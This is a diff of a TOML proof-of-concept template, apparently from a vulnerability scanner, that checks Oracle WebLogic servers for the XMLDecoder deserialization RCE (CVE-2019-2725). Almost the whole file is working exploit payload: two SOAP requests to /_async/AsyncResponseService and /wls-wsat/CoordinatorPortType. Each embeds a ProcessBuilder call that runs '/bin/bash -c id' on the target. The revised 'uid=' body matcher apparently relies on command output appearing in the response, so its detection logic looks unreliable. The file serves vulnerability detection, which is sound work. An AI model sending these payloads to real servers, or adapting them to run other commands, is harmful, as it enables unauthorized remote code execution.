@@ -1,10 +1,10 @@
 [info]
-author = "AVE"
-description = "检测目标 WebLogic 服务器是否存在 wls9-async 组件反序列化远程代码执行漏洞（CVE-2019-2725）。通过向 /wls-wsat/CoordinatorPortType 和 /_async/AsyncResponseService 接口发送包含恶意 XMLDecoder 序列化数据的 SOAP 请求，若返回 202 状态码则表明目标存在漏洞。"
+author = "ave"
+description = "检测 Oracle WebLogic Server 的 wls9_async_response 和 wls-wsat 组件的 XMLDecoder 反序列化远程代码执行漏洞，通过发送特制 SOAP 请求验证漏洞存在性"
 id = "POC-AVE-2019-1168"
-name = "Oracle WebLogic Server wls9-async 组件远程代码执行漏洞 PoC"
+name = "CVE-2019-2725 WebLogic XMLDecoder RCE PoC"
 severity = "critical"
-tags = ["ave-2019-1168"]
+tags = ["cve-2019-2725"]
 vuln_id = [
     "CVE-2019-2725",
     "AVE-2019-1168",
@@ -15,28 +15,74 @@ logic = "any"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/wls-wsat/CoordinatorPortType"
-protocol = "http"
-
-[poc.requests.body]
-content = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>id</string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>'
-type = "raw"
-
-[[poc.requests.matchers]]
-expect = true
-status = [202]
-type = "status"
-
-[[poc.requests]]
-method = "POST"
 path = "/{{BaseURL}}/_async/AsyncResponseService"
 protocol = "http"
 
 [poc.requests.body]
-content = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>id</string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>'
+content = """
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
+  <soapenv:Header>
+    <wsa:Action>xx</wsa:Action>
+    <wsa:RelatesTo>xx</wsa:RelatesTo>
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+      <java version="1.8.0" class="java.beans.XMLDecoder">
+        <void class="java.lang.ProcessBuilder">
+          <array class="java.lang.String" length="3">
+            <void index="0"><string>/bin/bash</string></void>
+            <void index="1"><string>-c</string></void>
+            <void index="2"><string>id</string></void>
+          </array>
+          <void method="start"/>
+        </void>
+      </java>
+    </work:WorkContext>
+  </soapenv:Header>
+  <soapenv:Body>
+    <asy:onAsyncDelivery/>
+  </soapenv:Body>
+</soapenv:Envelope>"""
 type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/xml"
 
 [[poc.requests.matchers]]
 expect = true
-status = [202]
-type = "status"
+part = "body"
+type = "word"
+words = ["uid="]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/wls-wsat/CoordinatorPortType"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Header>
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+      <java version="1.8.0" class="java.beans.XMLDecoder">
+        <void class="java.lang.ProcessBuilder">
+          <array class="java.lang.String" length="3">
+            <void index="0"><string>/bin/bash</string></void>
+            <void index="1"><string>-c</string></void>
+            <void index="2"><string>id</string></void>
+          </array>
+          <void method="start"/>
+        </void>
+      </java>
+    </work:WorkContext>
+  </soapenv:Header>
+  <soapenv:Body/>
+</soapenv:Envelope>"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/xml"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
